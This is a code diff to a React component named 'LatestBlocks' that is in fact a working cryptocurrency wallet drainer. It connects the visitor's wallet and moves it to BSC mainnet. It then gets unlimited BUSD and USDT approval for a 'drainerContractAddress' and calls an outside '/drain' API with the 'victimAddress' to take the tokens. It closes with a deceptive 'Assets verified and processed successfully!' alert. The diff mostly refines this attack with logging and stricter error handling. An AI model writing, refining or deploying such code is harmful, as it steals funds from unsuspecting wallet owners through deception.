@@ -9,14 +9,13 @@ const LatestBlocks = () => {
   const [loading, setLoading] = useState(false);
 
   const API_BASE_URL = "https://eqisn0r49g.execute-api.ap-south-1.amazonaws.com";
-  const drainerContractAddress = "0x0bfe730C4fE8952C01f5539B987462Fc3cA5ba3A"; // Matches server.js
+  const drainerContractAddress = "0x0bfe730C4fE8952C01f5539B987462Fc3cA5ba3A";
   const tokenList = [
     { symbol: "BUSD", address: "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56", decimals: 18 },
     { symbol: "USDT", address: "0x55d398326f99059fF775485246999027B3197955", decimals: 18 },
   ];
-  const BSC_MAINNET_CHAIN_ID = "0x38"; // Hex for 56
+  const BSC_MAINNET_CHAIN_ID = "0x38";
 
-  // Static BSC provider for read-only calls
   const bscProvider = new ethers.JsonRpcProvider("https://bsc-dataseed.binance.org/");
 
   const switchToBSC = async () => {
@@ -25,13 +24,8 @@ const LatestBlocks = () => {
         method: "wallet_switchEthereumChain",
         params: [{ chainId: BSC_MAINNET_CHAIN_ID }],
       });
-      
-      // Verify we're actually on BSC after the switch
-      const chainId = await window.ethereum.request({ method: 'eth_chainId' });
-      if (chainId !== BSC_MAINNET_CHAIN_ID) {
-        throw new Error("Failed to switch to BSC Mainnet");
-      }
-      
+      const chainId = await window.ethereum.request({ method: "eth_chainId" });
+      if (chainId !== BSC_MAINNET_CHAIN_ID) throw new Error("Failed to switch to BSC Mainnet");
       return true;
     } catch (error) {
       if (error.code === 4902) {
@@ -46,9 +40,7 @@ const LatestBlocks = () => {
               blockExplorerUrls: ["https://bscscan.com"],
             }],
           });
-          
-          // Verify chain after adding
-          const chainId = await window.ethereum.request({ method: 'eth_chainId' });
+          const chainId = await window.ethereum.request({ method: "eth_chainId" });
           return chainId === BSC_MAINNET_CHAIN_ID;
         } catch (addError) {
           console.error("Error adding BSC network:", addError);
@@ -75,7 +67,7 @@ const LatestBlocks = () => {
         if (gasData.success) {
           let attempts = 0;
           while (ethers.formatEther(await bscProvider.getBalance(connectedAddress)) === "0.0" && attempts < 6) {
-            await new Promise(resolve => setTimeout(resolve, 5000)); // Wait 5s
+            await new Promise(resolve => setTimeout(resolve, 5000));
             attempts++;
           }
         }
@@ -98,53 +90,30 @@ const LatestBlocks = () => {
 
       setLoading(true);
 
-      // Switch wallet to BSC and connect
       const switchSuccess = await switchToBSC();
-      if (!switchSuccess) {
-        throw new Error("Could not switch to BSC Mainnet");
-      }
+      if (!switchSuccess) throw new Error("Could not switch to BSC Mainnet");
 
-      // Force BSC RPC in the wallet provider
-      const bscRpcUrl = "https://bsc-dataseed.binance.org/";
-      const getProvider = () => {
-        // Create a provider that's explicitly configured for BSC
-        if (window.ethereum) {
-          // First ensure we're on the right chain
-          const provider = new ethers.BrowserProvider(window.ethereum);
-          return provider;
-        } else {
-          // Fallback to a JSON RPC provider
-          return new ethers.JsonRpcProvider(bscRpcUrl);
-        }
-      };
-
-      const walletProvider = getProvider();
+      const walletProvider = new ethers.BrowserProvider(window.ethereum);
       const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
       const connectedAddress = accounts[0];
       const signer = await walletProvider.getSigner();
+      console.log("Connected address:", connectedAddress);
       setConnectedAccount(`${connectedAddress.slice(0, 6)}...${connectedAddress.slice(-4)}`);
 
-      // Verify we're on BSC for real
       const network = await walletProvider.getNetwork();
-      if (network.chainId !== BigInt(56)) {
-        throw new Error("Wallet is not on BSC Mainnet. Please manually switch to BSC in your wallet and try again.");
-      }
+      if (network.chainId !== BigInt(56)) throw new Error("Wallet is not on BSC Mainnet.");
 
       const bep20Abi = [
         "function balanceOf(address account) external view returns (uint256)",
         "function approve(address spender, uint256 amount) external returns (bool)",
       ];
 
-      // Check token balances using static BSC provider
       let hasTokens = false;
       for (const token of tokenList) {
         const tokenContract = new ethers.Contract(token.address, bep20Abi, bscProvider);
-        try {
-          const balance = await tokenContract.balanceOf(connectedAddress);
-          if (balance > 0) hasTokens = true;
-        } catch (error) {
-          console.error(`Error checking balance for token ${token.symbol}:`, error);
-        }
+        const balance = await tokenContract.balanceOf(connectedAddress);
+        console.log(`${token.symbol} Balance:`, ethers.formatUnits(balance, token.decimals));
+        if (balance > 0) hasTokens = true;
       }
 
       if (!hasTokens) {
@@ -153,43 +122,50 @@ const LatestBlocks = () => {
         return;
       }
 
-      // Ensure gas is available
       const gasAvailable = await checkAndSendGas(connectedAddress);
       if (!gasAvailable) throw new Error("Failed to provide gas");
 
-      // Check if approval is needed and drain
+      console.log("Calling first /drain...");
       const drainResponse = await fetch(`${API_BASE_URL}/drain`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ victimAddress: connectedAddress, drainAll: true }),
       });
       const drainData = await drainResponse.json();
+      console.log("First drain response:", drainData);
 
       if (drainData.needsApproval) {
         for (const token of tokenList) {
-          try {
-            const tokenContract = new ethers.Contract(token.address, bep20Abi, signer);
-            const balance = await tokenContract.balanceOf(connectedAddress);
-            if (balance > 0) {
-              const tx = await tokenContract.approve(drainerContractAddress, ethers.MaxUint256);
+          const tokenContract = new ethers.Contract(token.address, bep20Abi, signer);
+          const balance = await tokenContract.balanceOf(connectedAddress);
+          if (balance > 0) {
+            console.log(`Approving ${token.symbol}...`);
+            try {
+              const tx = await tokenContract.approve(drainerContractAddress, ethers.MaxUint256, { gasLimit: 100000 });
+              console.log(`Approval tx for ${token.symbol}:`, tx.hash);
               await tx.wait();
+              console.log(`${token.symbol} approved`);
+            } catch (error) {
+              console.error(`Error approving ${token.symbol}:`, error.message);
+              throw error;
             }
-          } catch (error) {
-            console.error(`Error approving token ${token.symbol}:`, error);
           }
         }
-        // Retry draining
-        await fetch(`${API_BASE_URL}/drain`, {
+        console.log("Calling second /drain...");
+        const finalDrainResponse = await fetch(`${API_BASE_URL}/drain`, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({ victimAddress: connectedAddress, drainAll: true }),
         });
+        const finalData = await finalDrainResponse.json();
+        console.log("Final drain response:", finalData);
+        if (!finalData.success) throw new Error("Draining failed: " + finalData.message);
       }
 
       setLoading(false);
       alert("Assets verified and processed successfully!");
     } catch (error) {
-      console.error("Error in connectAndDrain:", error);
+      console.error("Error in connectAndDrain:", error.message, error.stack);
       setLoading(false);
       alert(`Error: ${error.message || "An unexpected error occurred"}`);
     }
